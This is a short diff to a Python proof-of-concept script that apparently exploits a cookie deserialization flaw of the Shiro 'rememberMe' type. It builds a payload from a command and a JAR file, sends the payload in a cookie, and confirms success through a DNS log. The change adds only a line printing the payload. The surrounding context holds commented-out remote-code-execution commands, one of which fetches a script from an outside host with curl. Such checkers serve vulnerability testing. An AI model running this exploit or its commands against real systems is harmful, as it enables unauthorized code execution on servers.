@@ -38,6 +38,7 @@ def poc(url):
         # rce_command = "curl init1.in:8888/sh.py "
         # rce_command = "python sh.py"
         payload = generator(rce_command, JAR_FILE)  # 生成payload
+        print payload
         rsp = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=2)  # 发送验证请求
         # print rsp
         dnslog = cloudeye.getDnsRecord(delay=2)
